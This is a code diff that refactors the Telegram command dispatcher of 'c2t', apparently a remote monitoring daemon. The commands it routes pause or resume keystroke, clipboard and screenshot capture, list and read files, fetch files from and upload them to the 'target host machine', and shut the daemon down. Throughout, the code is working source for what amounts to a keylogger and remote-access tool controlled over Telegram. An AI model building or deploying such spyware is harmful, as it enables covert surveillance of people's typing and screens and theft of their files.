@@ -104,6 +104,158 @@ static int c2t_strcasecmp(const char *left, const char *right) {
 #endif
 }
 
+typedef enum {
+  CMD_UNKNOWN = 0,
+  CMD_PAUSE,
+  CMD_RESUME,
+  CMD_TOGGLE,
+  CMD_CLIPBOARD_ON,
+  CMD_CLIPBOARD_OFF,
+  CMD_CLIPBOARD_TOGGLE,
+  CMD_CLIPBOARD_FLUSH,
+  CMD_CLIPBOARD_STATUS,
+  CMD_CLIPBOARD_HELP,
+  CMD_KEYBOARD_DEVICES,
+  CMD_KEYBOARD_SELECT,
+  CMD_KEYBOARD_ON,
+  CMD_KEYBOARD_OFF,
+  CMD_KEYBOARD_TOGGLE,
+  CMD_KEYBOARD_MODE,
+  CMD_KEYBOARD_FLUSH,
+  CMD_KEYBOARD_STATUS,
+  CMD_KEYBOARD_LAYOUT,
+  CMD_KEYBOARD_SHORTCUTS,
+  CMD_KEYBOARD_HELP,
+  CMD_GETFILE,
+  CMD_LS,
+  CMD_CAT,
+  CMD_FILEINFO,
+  CMD_UPLOAD,
+  CMD_LOGS,
+  CMD_SCREENSHOT,
+  CMD_SCREENSHOT_DISPLAYS,
+  CMD_SCREENSHOT_SELECT,
+  CMD_SCREENSHOT_TIMER,
+  CMD_SCREENSHOT_ON,
+  CMD_SCREENSHOT_OFF,
+  CMD_SCREENSHOT_TOGGLE,
+  CMD_SCREENSHOT_FORMAT,
+  CMD_SCREENSHOT_QUALITY,
+  CMD_SCREENSHOT_STATUS,
+  CMD_SCREENSHOT_HELP,
+  CMD_STATUS,
+  CMD_KILL,
+  CMD_HELP
+} c2t_cmd_id_t;
+
+#define CMD_TABLE_SIZE 256U
+#define CMD_TABLE_MASK (CMD_TABLE_SIZE - 1U)
+
+typedef struct {
+  const char *name;
+  c2t_cmd_id_t id;
+} cmd_entry_t;
+
+static const cmd_entry_t g_cmd_mappings[] = {
+  {"pause", CMD_PAUSE}, {"mute", CMD_PAUSE}, {"stop_listen", CMD_PAUSE}, {"disable", CMD_PAUSE},
+  {"resume", CMD_RESUME}, {"unmute", CMD_RESUME}, {"start_listen", CMD_RESUME}, {"enable", CMD_RESUME},
+  {"toggle", CMD_TOGGLE},
+  {"clipboard_on", CMD_CLIPBOARD_ON}, {"clipboard_enable", CMD_CLIPBOARD_ON}, {"clipboard_resume", CMD_CLIPBOARD_ON}, {"clipboard_start", CMD_CLIPBOARD_ON}, {"unmute_clipboard", CMD_CLIPBOARD_ON}, {"resume_clipboard", CMD_CLIPBOARD_ON},
+  {"clipboard_off", CMD_CLIPBOARD_OFF}, {"clipboard_disable", CMD_CLIPBOARD_OFF}, {"clipboard_pause", CMD_CLIPBOARD_OFF}, {"clipboard_stop", CMD_CLIPBOARD_OFF}, {"mute_clipboard", CMD_CLIPBOARD_OFF}, {"pause_clipboard", CMD_CLIPBOARD_OFF},
+  {"clipboard_toggle", CMD_CLIPBOARD_TOGGLE},
+  {"clipboard_flush", CMD_CLIPBOARD_FLUSH},
+  {"clipboard_status", CMD_CLIPBOARD_STATUS}, {"clipboard", CMD_CLIPBOARD_STATUS},
+  {"clipboard_help", CMD_CLIPBOARD_HELP},
+  {"keyboard_devices", CMD_KEYBOARD_DEVICES}, {"keyboard_list", CMD_KEYBOARD_DEVICES}, {"keyboards", CMD_KEYBOARD_DEVICES},
+  {"keyboard_select", CMD_KEYBOARD_SELECT}, {"keyboard_device", CMD_KEYBOARD_SELECT}, {"keyboard_target", CMD_KEYBOARD_SELECT},
+  {"keyboard_on", CMD_KEYBOARD_ON}, {"keyboard_enable", CMD_KEYBOARD_ON}, {"keyboard_resume", CMD_KEYBOARD_ON}, {"keyboard_start", CMD_KEYBOARD_ON}, {"unmute_keyboard", CMD_KEYBOARD_ON}, {"resume_keyboard", CMD_KEYBOARD_ON},
+  {"keyboard_off", CMD_KEYBOARD_OFF}, {"keyboard_disable", CMD_KEYBOARD_OFF}, {"keyboard_pause", CMD_KEYBOARD_OFF}, {"keyboard_stop", CMD_KEYBOARD_OFF}, {"mute_keyboard", CMD_KEYBOARD_OFF}, {"pause_keyboard", CMD_KEYBOARD_OFF},
+  {"keyboard_toggle", CMD_KEYBOARD_TOGGLE},
+  {"keyboard_mode", CMD_KEYBOARD_MODE},
+  {"keyboard_flush", CMD_KEYBOARD_FLUSH},
+  {"keyboard_status", CMD_KEYBOARD_STATUS}, {"keyboard", CMD_KEYBOARD_STATUS},
+  {"keyboard_layout", CMD_KEYBOARD_LAYOUT}, {"keyboard_layouts", CMD_KEYBOARD_LAYOUT}, {"layout", CMD_KEYBOARD_LAYOUT}, {"layouts", CMD_KEYBOARD_LAYOUT},
+  {"keyboard_shortcuts", CMD_KEYBOARD_SHORTCUTS}, {"keyboard_shortcut", CMD_KEYBOARD_SHORTCUTS}, {"shortcuts", CMD_KEYBOARD_SHORTCUTS}, {"shortcut", CMD_KEYBOARD_SHORTCUTS},
+  {"keyboard_help", CMD_KEYBOARD_HELP},
+  {"getfile", CMD_GETFILE}, {"file", CMD_GETFILE}, {"download", CMD_GETFILE}, {"fetch", CMD_GETFILE}, {"get", CMD_GETFILE},
+  {"ls", CMD_LS}, {"dir", CMD_LS}, {"list", CMD_LS},
+  {"cat", CMD_CAT}, {"view", CMD_CAT}, {"read", CMD_CAT}, {"preview", CMD_CAT},
+  {"fileinfo", CMD_FILEINFO}, {"file_info", CMD_FILEINFO}, {"stat", CMD_FILEINFO},
+  {"upload", CMD_UPLOAD}, {"put", CMD_UPLOAD}, {"sendfile", CMD_UPLOAD}, {"upfile", CMD_UPLOAD},
+  {"logs", CMD_LOGS}, {"log", CMD_LOGS},
+  {"screenshot", CMD_SCREENSHOT}, {"screen", CMD_SCREENSHOT}, {"shot", CMD_SCREENSHOT}, {"capture", CMD_SCREENSHOT},
+  {"screenshot_displays", CMD_SCREENSHOT_DISPLAYS}, {"screens", CMD_SCREENSHOT_DISPLAYS}, {"monitors", CMD_SCREENSHOT_DISPLAYS}, {"displays", CMD_SCREENSHOT_DISPLAYS},
+  {"screenshot_select", CMD_SCREENSHOT_SELECT}, {"screen_select", CMD_SCREENSHOT_SELECT}, {"display_select", CMD_SCREENSHOT_SELECT},
+  {"screenshot_timer", CMD_SCREENSHOT_TIMER}, {"screenshot_interval", CMD_SCREENSHOT_TIMER},
+  {"screenshot_on", CMD_SCREENSHOT_ON}, {"screenshot_enable", CMD_SCREENSHOT_ON}, {"screenshot_resume", CMD_SCREENSHOT_ON}, {"screenshot_start", CMD_SCREENSHOT_ON},
+  {"screenshot_off", CMD_SCREENSHOT_OFF}, {"screenshot_disable", CMD_SCREENSHOT_OFF}, {"screenshot_pause", CMD_SCREENSHOT_OFF}, {"screenshot_stop", CMD_SCREENSHOT_OFF}, {"mute_screenshot", CMD_SCREENSHOT_OFF},
+  {"screenshot_toggle", CMD_SCREENSHOT_TOGGLE},
+  {"screenshot_format", CMD_SCREENSHOT_FORMAT}, {"screenshot_fmt", CMD_SCREENSHOT_FORMAT}, {"shot_format", CMD_SCREENSHOT_FORMAT}, {"shot_fmt", CMD_SCREENSHOT_FORMAT},
+  {"screenshot_quality", CMD_SCREENSHOT_QUALITY}, {"screenshot_qual", CMD_SCREENSHOT_QUALITY}, {"shot_quality", CMD_SCREENSHOT_QUALITY}, {"shot_qual", CMD_SCREENSHOT_QUALITY},
+  {"screenshot_status", CMD_SCREENSHOT_STATUS},
+  {"screenshot_help", CMD_SCREENSHOT_HELP},
+  {"status", CMD_STATUS}, {"ping", CMD_STATUS},
+  {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
+  {"help", CMD_HELP}, {"start", CMD_HELP}
+};
+
+static cmd_entry_t s_cmd_table[CMD_TABLE_SIZE];
+static int s_cmd_table_ready = 0;
+
+static inline uint32_t hash_cmd_str(const char *str) {
+  uint32_t h = 2166136261U;
+  while (*str) {
+    h ^= (uint8_t)*str++;
+    h *= 16777619U;
+  }
+  return h;
+}
+
+static void init_cmd_table(void) {
+  if (s_cmd_table_ready) return;
+  memset(s_cmd_table, 0, sizeof(s_cmd_table));
+  size_t count = sizeof(g_cmd_mappings) / sizeof(g_cmd_mappings[0]);
+  for (size_t i = 0; i < count; i++) {
+    uint32_t h = hash_cmd_str(g_cmd_mappings[i].name);
+    size_t idx = h & CMD_TABLE_MASK;
+    while (s_cmd_table[idx].name != NULL) {
+      idx = (idx + 1) & CMD_TABLE_MASK;
+    }
+    s_cmd_table[idx] = g_cmd_mappings[i];
+  }
+  s_cmd_table_ready = 1;
+}
+
+[[nodiscard]] static c2t_cmd_id_t lookup_command_id(const char *text) {
+  if (!text) return CMD_UNKNOWN;
+  if (!s_cmd_table_ready) init_cmd_table();
+
+  while (isspace((unsigned char)*text)) text++;
+  if (*text == '/') text++;
+  if (!*text) return CMD_UNKNOWN;
+
+  char verb[64];
+  size_t len = 0;
+  while (*text && !isspace((unsigned char)*text) && *text != '@' && len + 1 < sizeof(verb)) {
+    char c = *text++;
+    if (c == '-') c = '_';
+    verb[len++] = (char)tolower((unsigned char)c);
+  }
+  verb[len] = '\0';
+  if (len == 0) return CMD_UNKNOWN;
+
+  uint32_t h = hash_cmd_str(verb);
+  size_t idx = h & CMD_TABLE_MASK;
+  for (size_t probe = 0; probe < CMD_TABLE_SIZE; probe++) {
+    size_t cur = (idx + probe) & CMD_TABLE_MASK;
+    if (!s_cmd_table[cur].name) break;
+    if (strcmp(s_cmd_table[cur].name, verb) == 0) {
+      return s_cmd_table[cur].id;
+    }
+  }
+  return CMD_UNKNOWN;
+}
+
 [[nodiscard]] static int match_command(const char *text, const char *cmd) {
   if (!text || !cmd)
     return 0;
@@ -189,8 +341,9 @@ static void handle_command(const telegram_incoming_update_t *update,
   c2t_log_info("listener", "Executing Telegram command '%s' from chat %s", text,
                chat_id);
 
-  if (match_command(text, "pause") || match_command(text, "mute") ||
-      match_command(text, "stop_listen") || match_command(text, "disable")) {
+  c2t_cmd_id_t cmd = lookup_command_id(text);
+  switch (cmd) {
+  case CMD_PAUSE: {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
     int shot_enabled = !config->disable_screenshot;
@@ -210,9 +363,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "⏸️ <b>Monitoring Paused</b>\n<i>All active monitoring captures "
           "are paused until resumed with /resume or /toggle.</i>");
     }
-  } else if (match_command(text, "resume") || match_command(text, "unmute") ||
-             match_command(text, "start_listen") ||
-             match_command(text, "enable")) {
+    break;
+  }
+
+  case CMD_RESUME: {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
     int shot_enabled = !config->disable_screenshot;
@@ -232,7 +386,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and "
           "forwarding events.</i>");
     }
-  } else if (match_command(text, "toggle")) {
+    break;
+  }
+
+  case CMD_TOGGLE: {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
     int shot_enabled = !config->disable_screenshot;
@@ -261,12 +418,10 @@ static void handle_command(const telegram_incoming_update_t *update,
                            "monitoring is now running.</i>");
       }
     }
-  } else if (match_command(text, "clipboard_on") ||
-             match_command(text, "clipboard_enable") ||
-             match_command(text, "clipboard_resume") ||
-             match_command(text, "clipboard_start") ||
-             match_command(text, "unmute_clipboard") ||
-             match_command(text, "resume_clipboard")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_ON: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -279,12 +434,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is "
           "actively capturing clipboard events.</i>");
     }
-  } else if (match_command(text, "clipboard_off") ||
-             match_command(text, "clipboard_disable") ||
-             match_command(text, "clipboard_pause") ||
-             match_command(text, "clipboard_stop") ||
-             match_command(text, "mute_clipboard") ||
-             match_command(text, "pause_clipboard")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_OFF: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -296,7 +449,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard "
                          "event capturing is currently muted.</i>");
     }
-  } else if (match_command(text, "clipboard_toggle")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_TOGGLE: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -315,7 +471,10 @@ static void handle_command(const telegram_incoming_update_t *update,
             "actively capturing events.</i>");
       }
     }
-  } else if (match_command(text, "clipboard_flush")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_FLUSH: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -328,8 +487,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       telegram_send_html("⚡ <b>Clipboard Queue Flushed</b>\n<i>Worker "
                          "signaled to process any queued clipboard items.</i>");
     }
-  } else if (match_command(text, "clipboard_status") ||
-             match_command(text, "clipboard")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_STATUS: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -339,7 +500,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       clipboard_get_status_info(stat_msg, sizeof(stat_msg));
       telegram_send_html(stat_msg);
     }
-  } else if (match_command(text, "clipboard_help")) {
+    break;
+  }
+
+  case CMD_CLIPBOARD_HELP: {
     if (config->disable_clipboard) {
       telegram_send_html(
           "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
@@ -360,9 +524,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "<code>/clipboard-status</code>)</i>");
       telegram_send_html(clip_help);
     }
-  } else if (match_command(text, "keyboard_devices") ||
-             match_command(text, "keyboard_list") ||
-             match_command(text, "keyboards")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_DEVICES: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -375,9 +540,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html("⚠️ <i>Unable to query keyboard devices.</i>");
       }
     }
-  } else if (match_command(text, "keyboard_select") ||
-             match_command(text, "keyboard_device") ||
-             match_command(text, "keyboard_target")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_SELECT: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -410,12 +576,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html(resp);
       }
     }
-  } else if (match_command(text, "keyboard_on") ||
-             match_command(text, "keyboard_enable") ||
-             match_command(text, "keyboard_resume") ||
-             match_command(text, "keyboard_start") ||
-             match_command(text, "unmute_keyboard") ||
-             match_command(text, "resume_keyboard")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_ON: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -427,12 +591,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard "
                          "listener is now capturing keystrokes.</i>");
     }
-  } else if (match_command(text, "keyboard_off") ||
-             match_command(text, "keyboard_disable") ||
-             match_command(text, "keyboard_pause") ||
-             match_command(text, "keyboard_stop") ||
-             match_command(text, "mute_keyboard") ||
-             match_command(text, "pause_keyboard")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_OFF: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -444,7 +606,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke "
                          "capturing is currently muted.</i>");
     }
-  } else if (match_command(text, "keyboard_toggle")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_TOGGLE: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -462,7 +627,10 @@ static void handle_command(const telegram_incoming_update_t *update,
                            "listener is now capturing keystrokes.</i>");
       }
     }
-  } else if (match_command(text, "keyboard_mode")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_MODE: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -498,7 +666,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html(resp);
       }
     }
-  } else if (match_command(text, "keyboard_flush")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_FLUSH: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -511,8 +682,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       telegram_send_html("⚡ <b>Keyboard Buffer Flushed</b>\n<i>Pending "
                          "keystrokes have been dispatched.</i>");
     }
-  } else if (match_command(text, "keyboard_status") ||
-             match_command(text, "keyboard")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_STATUS: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -522,9 +695,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       keyboard_get_status_info(stat_msg, sizeof(stat_msg));
       telegram_send_html(stat_msg);
     }
-  } else if (match_command(text, "keyboard_layout") ||
-             match_command(text, "keyboard_layouts") ||
-             match_command(text, "layout") || match_command(text, "layouts")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_LAYOUT: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -575,10 +749,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "keyboard_shortcuts") ||
-             match_command(text, "keyboard_shortcut") ||
-             match_command(text, "shortcuts") ||
-             match_command(text, "shortcut")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_SHORTCUTS: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -631,7 +805,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html(resp);
       }
     }
-  } else if (match_command(text, "keyboard_help")) {
+    break;
+  }
+
+  case CMD_KEYBOARD_HELP: {
     if (config->disable_keyboard) {
       telegram_send_html(
           "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
@@ -662,9 +839,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "<code>/keyboard-shortcuts off</code>)</i>");
       telegram_send_html(kb_help);
     }
-  } else if (match_command(text, "getfile") || match_command(text, "file") ||
-             match_command(text, "download") || match_command(text, "fetch") ||
-             match_command(text, "get")) {
+    break;
+  }
+
+  case CMD_GETFILE: {
     const char *arg = get_command_argument(text);
     if (!arg || !*arg) {
       telegram_send_html(
@@ -677,8 +855,10 @@ static void handle_command(const telegram_incoming_update_t *update,
                    "Retrieving file '%s' on-demand by Telegram command", arg);
       (void)c2t_file_send_path(arg, nullptr);
     }
-  } else if (match_command(text, "ls") || match_command(text, "dir") ||
-             match_command(text, "list")) {
+    break;
+  }
+
+  case CMD_LS: {
     const char *arg = get_command_argument(text);
     char list_resp[3800];
     c2t_log_info("listener",
@@ -693,8 +873,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html("⚠️ <i>Unable to list directory.</i>");
       }
     }
-  } else if (match_command(text, "cat") || match_command(text, "view") ||
-             match_command(text, "read") || match_command(text, "preview")) {
+    break;
+  }
+
+  case CMD_CAT: {
     const char *arg = get_command_argument(text);
     if (!arg || !*arg) {
       telegram_send_html("⚠️ <b>Usage:</b> <code>/cat &lt;file_path&gt;</code>\n"
@@ -717,8 +899,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "fileinfo") ||
-             match_command(text, "file_info") || match_command(text, "stat")) {
+    break;
+  }
+
+  case CMD_FILEINFO: {
     const char *arg = get_command_argument(text);
     if (!arg || !*arg) {
       telegram_send_html("⚠️ <b>Usage:</b> <code>/fileinfo &lt;path&gt;</code>\n"
@@ -738,8 +922,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "upload") || match_command(text, "put") ||
-             match_command(text, "sendfile") || match_command(text, "upfile")) {
+    break;
+  }
+
+  case CMD_UPLOAD: {
     telegram_send_html(
         "📤 <b>Upload File to Host</b>\n\n"
         "To upload a file to the target host machine:\n"
@@ -750,13 +936,16 @@ static void handle_command(const telegram_incoming_update_t *update,
         "directory.\n\n"
         "💡 <i>Use <code>/ls</code> to explore directories or "
         "<code>/getfile</code> to download.</i>");
-  } else if (match_command(text, "logs") || match_command(text, "log")) {
+    break;
+  }
+
+  case CMD_LOGS: {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
-  } else if (match_command(text, "screenshot") ||
-             match_command(text, "screen") ||
-             match_command(text, "shot") ||
-             match_command(text, "capture")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -781,10 +970,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "screenshot_displays") ||
-             match_command(text, "screens") ||
-             match_command(text, "monitors") ||
-             match_command(text, "displays")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_DISPLAYS: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -794,9 +983,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       (void)screenshot_get_display_list(disp_buf, sizeof(disp_buf));
       telegram_send_html(disp_buf);
     }
-  } else if (match_command(text, "screenshot_select") ||
-             match_command(text, "screen_select") ||
-             match_command(text, "display_select")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_SELECT: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -824,8 +1014,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html(resp);
       }
     }
-  } else if (match_command(text, "screenshot_timer") ||
-             match_command(text, "screenshot_interval")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_TIMER: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -865,10 +1057,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "screenshot_on") ||
-             match_command(text, "screenshot_enable") ||
-             match_command(text, "screenshot_resume") ||
-             match_command(text, "screenshot_start")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_ON: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -879,11 +1071,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "📸 <b>Screenshot Monitoring:</b> 🟢 <b>RESUMED</b>\n<i>Periodic "
           "screenshot captures are active.</i>");
     }
-  } else if (match_command(text, "screenshot_off") ||
-             match_command(text, "screenshot_disable") ||
-             match_command(text, "screenshot_pause") ||
-             match_command(text, "screenshot_stop") ||
-             match_command(text, "mute_screenshot")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_OFF: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -894,7 +1085,10 @@ static void handle_command(const telegram_incoming_update_t *update,
           "📸 <b>Screenshot Monitoring:</b> ⏸️ <b>PAUSED</b>\n<i>Periodic "
           "screenshot captures are muted.</i>");
     }
-  } else if (match_command(text, "screenshot_toggle")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_TOGGLE: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -907,10 +1101,10 @@ static void handle_command(const telegram_incoming_update_t *update,
                s ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b>");
       telegram_send_html(resp);
     }
-  } else if (match_command(text, "screenshot_format") ||
-             match_command(text, "screenshot_fmt") ||
-             match_command(text, "shot_format") ||
-             match_command(text, "shot_fmt")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_FORMAT: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -950,10 +1144,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         telegram_send_html(resp);
       }
     }
-  } else if (match_command(text, "screenshot_quality") ||
-             match_command(text, "screenshot_qual") ||
-             match_command(text, "shot_quality") ||
-             match_command(text, "shot_qual")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_QUALITY: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -989,7 +1183,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         }
       }
     }
-  } else if (match_command(text, "screenshot_status")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_STATUS: {
     if (config->disable_screenshot) {
       telegram_send_html(
           "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
@@ -999,7 +1196,10 @@ static void handle_command(const telegram_incoming_update_t *update,
       screenshot_get_status_info(shot_stat, sizeof(shot_stat));
       telegram_send_html(shot_stat);
     }
-  } else if (match_command(text, "screenshot_help")) {
+    break;
+  }
+
+  case CMD_SCREENSHOT_HELP: {
     char shot_help[1400];
     snprintf(
         shot_help, sizeof(shot_help),
@@ -1015,7 +1215,10 @@ static void handle_command(const telegram_incoming_update_t *update,
         "• <code>/screenshot_status</code> - View screenshot monitor status &amp; backend\n\n"
         "💡 <i>Tip: Multi-monitor setups can target a specific screen (e.g. <code>/screenshot 0</code> or <code>/screenshot all</code>)</i>");
     telegram_send_html(shot_help);
-  } else if (match_command(text, "status") || match_command(text, "ping")) {
+    break;
+  }
+
+  case CMD_STATUS: {
     int clip_paused = clipboard_is_paused();
     int key_paused = keyboard_is_paused();
     int shot_paused = screenshot_is_paused();
@@ -1093,10 +1296,10 @@ static void handle_command(const telegram_incoming_update_t *update,
              (unsigned long long)config->queue_max_items,
              (unsigned long long)(config->queue_max_bytes / (1024 * 1024)));
     telegram_send_html(status_msg);
-  } else if (match_command(text, "kill") || match_command(text, "stop") ||
-             match_command(text, "shutdown") ||
-             match_command(text, "terminate") || match_command(text, "quit") ||
-             match_command(text, "exit")) {
+    break;
+  }
+
+  case CMD_KILL: {
     c2t_log_warning(
         "listener",
         "Complete daemon shutdown initiated by Telegram command '%s'", text);
@@ -1111,7 +1314,10 @@ static void handle_command(const telegram_incoming_update_t *update,
 
     c2t_runtime_request_stop();
     (void)c2t_runtime_stop(1000, 1);
-  } else if (match_command(text, "help") || match_command(text, "start")) {
+    break;
+  }
+
+  case CMD_HELP: {
     /* The complete conditional help is larger than 2 KiB when clipboard,
      * keyboard, and screenshot support are all enabled.  Keep enough room for
      * every section while remaining below Telegram's 4096-character limit. */
@@ -1205,6 +1411,12 @@ static void handle_command(const telegram_incoming_update_t *update,
     }
     help_msg[h_off] = '\0';
     telegram_send_html(help_msg);
+    break;
+  }
+
+  case CMD_UNKNOWN:
+  default:
+    break;
   }
 }
 
